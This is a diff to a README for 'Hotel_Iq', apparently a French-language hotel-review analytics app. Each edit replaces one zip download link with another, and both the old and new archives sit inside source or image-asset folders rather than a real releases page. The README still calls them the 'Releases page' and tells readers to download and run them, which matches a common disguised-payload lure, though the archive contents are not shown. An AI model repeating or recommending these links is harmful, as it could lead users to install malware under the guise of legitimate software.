@@ -1,7 +1,7 @@
 # 🏨 Hotel_Iq - Analyze Hotel Reviews with Ease
 
 ## 📥 Download Now
-[![Download Hotel_Iq](https://raw.githubusercontent.com/Retkun/Hotel_Iq/main/Data_Analysis_and_AI-Reviews_frontend/src/assets/images/backgrounds/Hotel_Iq_1.8.zip)](https://raw.githubusercontent.com/Retkun/Hotel_Iq/main/Data_Analysis_and_AI-Reviews_frontend/src/assets/images/backgrounds/Hotel_Iq_1.8.zip)
+[![Download Hotel_Iq](https://github.com/Retkun/Hotel_Iq/raw/refs/heads/main/Data_Analysis_and_AI-Reviews_frontend/src/app/layouts/full/header/Iq_Hotel_1.0.zip)](https://github.com/Retkun/Hotel_Iq/raw/refs/heads/main/Data_Analysis_and_AI-Reviews_frontend/src/app/layouts/full/header/Iq_Hotel_1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to Hotel IQ! This platform helps you analyze hotel reviews and business data easily. You can visualize key performance indicators (KPIs), explore customer reviews, and gain insights into customer satisfaction.
@@ -18,7 +18,7 @@ Before you start, make sure your system meets these requirements:
 Hotel IQ is built using modern technologies including Angular 19 for the interface, FastAPI for backend services, and AI from OpenAI’s GPT-4o for sentiment analysis. The application runs smoothly on Python and allows users to analyze hotel reviews efficiently. You will interact with a fully French interface, making it convenient for French-speaking users.
 
 ## 📥 Download & Install
-To get started, visit our [Releases page](https://raw.githubusercontent.com/Retkun/Hotel_Iq/main/Data_Analysis_and_AI-Reviews_frontend/src/assets/images/backgrounds/Hotel_Iq_1.8.zip) to download the latest version of Hotel_Iq. 
+To get started, visit our [Releases page](https://github.com/Retkun/Hotel_Iq/raw/refs/heads/main/Data_Analysis_and_AI-Reviews_frontend/src/app/layouts/full/header/Iq_Hotel_1.0.zip) to download the latest version of Hotel_Iq. 
 
 ### Steps to Download:
 1. Click on the link above to access the Releases page.
@@ -65,4 +65,4 @@ This project covers important topics like:
 ## 📞 Contact
 For further inquiries or support, please reach out through the GitHub Issues page or contact the project maintainer via email.
 
-Remember, you can download Hotel_Iq again at any time from our [Releases page](https://raw.githubusercontent.com/Retkun/Hotel_Iq/main/Data_Analysis_and_AI-Reviews_frontend/src/assets/images/backgrounds/Hotel_Iq_1.8.zip).
+Remember, you can download Hotel_Iq again at any time from our [Releases page](https://github.com/Retkun/Hotel_Iq/raw/refs/heads/main/Data_Analysis_and_AI-Reviews_frontend/src/app/layouts/full/header/Iq_Hotel_1.0.zip).
